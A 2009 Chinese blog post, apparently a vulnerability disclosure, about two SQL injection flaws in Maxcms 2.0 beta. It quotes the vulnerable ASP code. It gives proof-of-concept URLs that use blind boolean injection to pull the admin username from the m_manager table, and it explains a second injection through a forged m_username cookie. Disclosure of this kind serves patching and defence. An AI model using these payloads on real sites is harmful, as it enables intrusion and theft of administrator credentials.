---
title: 马克斯CMS 2.0 beta (Maxcms)SQL注入漏洞
description: 马克斯CMS2.0beta(Maxcms)SQL注入漏洞关键字：首页-马克斯CMS2.0这个系统是国内非常流行的视频点播系统，之前的1.5版本漏洞非常多，2.0版本在安全方面有所提高，但是依然有漏洞存在。看代码......
date: 2009-02-02 09:46:23
category: 漏洞信息
tags: ['马克斯CMS', '注入', '漏洞信息']
post_id: 770
alias: Maxcms-2.0-beta-SQL-injection
ViewNums: 4065
---

[**马克斯CMS 2.0 beta (Maxcms)SQL注入漏洞**](/blog/maxcms-20-beta-sql-injection)

关键字：首页-马克斯CMS2.0

这个系统是国内非常流行的视频点播系统，之前的1.5版本漏洞非常多，2.0版本在安全方面有所提高，但是依然有漏洞存在。

看代码

incajax.asp
```

dim action : action = getForm("action", "get")
response.Charset="gbk"

Select  case action
    case "newslist" : viewNewsList
    case "newscontent" : viewNewsContent
    case "digg","tread" : scoreVideo(action)
    case "reporterr" : reportErr
    case "hit" : updateHit
    case else : main
End Select
terminateAllObjects

……

Sub scoreVideo(operType)
    dim sql,id,digg,returnValue : id=getForm("id","get")
    ‘通过get方式获取id的值
    if rCookie("maxcms2_score"&id)="ok" then die "havescore"
    if isNul(id) then die "err"
    'on error resume next
    digg=conn.db("select m_digg from {pre}data where m_id="&id,"execute")(0)
    ‘ 参数id，没有过滤就带入sql语句进行查询
    if err then digg=0 : err.clear()
    if not isNum(id) then echoSaveStr "safe" else id=clng(id)
    ‘ 查询到digg，注意返回的内容
```
……利用就很简单了，构造sql语句提交（默认结构是m_manager,m_username,m_pwd，根据返回的内容判断就可以了。如果构造的语句是正确的，就返回类似警告

你提交的数据有非法字符，你的IP【xxxx】已被记录,操作

构造的语句不正确，则返回500
Poc :

正确的:
http://demo.maxcms.net/inc/ajax.asp?action=digg&id=1%20and%20(select%20top%201%20asc(mid(m_username,1,1))%20from%20m_manager)=97

不正确的：
http://demo.maxcms.net/inc/ajax.asp?action=digg&id=1%20and%20(select%20top%201%20asc(mid(m_username,1,1))%20from%20m_manager)=99其实随便找个注射工具跑一下就ok了

另外一处注射
```
Sub checkPower
    dim loginValidate,rsObj : loginValidate = "maxcms2.0"
    err.clear
    on error resume next
    set rsObj=conn.db("select m_random,m_level from {pre}manager where m_username='"&rCookie("m_username")&"'","execute")
    loginValidate = md5(getAgent&getIp&rsObj(0))
    if err then wCookie "check"&rCookie("m_username"),"" : die "<script>top.location.href='index.asp?action=login';</script>"
    if rCookie("check"&rCookie("m_username"))<>loginValidate then wCookie "check"&rCookie("m_username"),"" : die "<script>top.location.href='index.asp?action=login';</script>"
    checkManagerLevel  rsObj(1)
    set rsObj=nothing
End Sub其中

Function rCookie(cookieName)
    rCookie = request.cookies(cookieName)
End Function
```
通过伪造cookie中m_username的值可以进行注射

不过要知道后台管理目录，默认是/admin/，多个页面可以触发改函数
比如 /admin/admin_ajax.asp

作者：flyh4t
<http://bbs.wolvez.org>

